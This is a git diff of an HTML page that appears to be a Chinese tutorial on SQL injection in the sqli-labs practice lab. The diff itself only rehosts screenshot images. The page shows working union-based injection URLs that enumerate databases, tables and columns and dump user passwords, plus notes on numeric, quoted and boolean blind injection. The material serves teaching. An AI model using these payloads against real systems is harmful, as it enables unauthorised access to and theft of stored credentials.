@@ -125,8 +125,8 @@
 </li>
 </ul>
 <pre><code class="html">http://www.sql.com/Less-1/?id=1%27%20order%20by%201,2,3%20--+</code></pre>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190805/15649678592883.png" alt="1564883718907"></p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190805/15649679094636.png" alt="1564884099855"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649678592883.png" alt="1564883718907"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649679094636.png" alt="1564884099855"></p>
 <h4 id="检测回显位"><a href="#检测回显位" class="headerlink" title="检测回显位"></a>检测回显位</h4><ul>
 <li><strong>sql语句：</strong></li>
 </ul>
@@ -137,7 +137,7 @@
 <li><p><strong>eg:</strong></p>
 </li>
 </ul>
-<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,2,3--+</code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190805/15649682028375.png" alt="1564884653714"></p>
+<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,2,3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649682028375.png" alt="1564884653714"></p>
 <h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><ul>
 <li><strong>sql语句：</strong>                    </li>
 </ul>
@@ -146,7 +146,7 @@
 <li><strong>语义：</strong>查询information_schema数据库中的shcemata中的schema_name表段的内容，该数据库的该表段储存了Mysql所有数据库的名字（Mysql5.5+）</li>
 <li><strong>eg:</strong></li>
 </ul>
-<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(schema_name)%20from%20information_schema.schemata),3--+</code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190805/15649682417938.png" alt="1564885490338"></p>
+<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(schema_name)%20from%20information_schema.schemata),3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649682417938.png" alt="1564885490338"></p>
 <h4 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h4><ul>
 <li><strong>sql语句:</strong></li>
 </ul>
@@ -155,7 +155,7 @@
 <li><strong>语义：</strong>查询information_schema数据库中的tables表中的table_name内容条件为table_schema（保存数据库名字）为security,该语句将会爆出该数据库的所有表名</li>
 <li><strong>eg:</strong></li>
 </ul>
-<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=%27security%27),3--+</code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190805/15649683003970.png" alt="1564885936768"></p>
+<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(table_name)from%20information_schema.tables%20where%20table_schema=%27security%27),3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649683003970.png" alt="1564885936768"></p>
 <h4 id="爆表段"><a href="#爆表段" class="headerlink" title="爆表段"></a>爆表段</h4><ul>
 <li><strong>sql语句：</strong></li>
 </ul>
@@ -164,7 +164,7 @@
 <li><strong>语义:</strong>  该语句查询information_schema数据库中的columns表中column_name表段的值，条件table_name=’users‘,该语句可以查询出改表的所有表段</li>
 <li><strong>eg:</strong></li>
 </ul>
-<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_name=%27users%27),3--+</code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190805/15649683779377.png" alt="1564886738794"></p>
+<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(column_name)from%20information_schema.columns%20where%20table_name=%27users%27),3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/15649683779377.png" alt="1564886738794"></p>
 <h4 id="爆表段值"><a href="#爆表段值" class="headerlink" title="爆表段值"></a>爆表段值</h4><ul>
 <li><strong>sql语句:</strong></li>
 </ul>
@@ -173,7 +173,7 @@
 <li><strong>语义:</strong>查询security数据库中的user表中的password表段的所有值，查询用户名类似。</li>
 <li><strong>eg:</strong></li>
 </ul>
-<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(password)%20from%20security.users),3--+</code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190805/1564968443135.png" alt="1564887127624"></p>
+<pre><code>http://www.sql.com/Less-1/?id=-1%27%20union%20select%201,(select%20group_concat(password)%20from%20security.users),3--+</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20190805/1564968443135.png" alt="1564887127624"></p>
 <p>(完)</p>
 <h3 id="数值型注入"><a href="#数值型注入" class="headerlink" title="数值型注入"></a>数值型注入</h3><p><strong>标志：</strong>使用and1=1 和and 1=2时候出现页面变化说明是数值型注入。具体流程与上面一样，但是无需使用（’）作为闭合。</p>
 <h3 id="单引号括型字符型注入"><a href="#单引号括型字符型注入" class="headerlink" title="单引号括型字符型注入"></a>单引号括型字符型注入</h3><ul>
@@ -201,7 +201,7 @@
 </li>
 </ol>
 <p>例子：</p>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20190806/1565058715692.png" alt></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20190806/1565058715692.png" alt></p>
 <h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><pre><code class="mysql">#布尔盲注可能用到的函数
 ascii()#括号中的参数转化成相应的ascii码
 ORD()与ascii()#用法类似
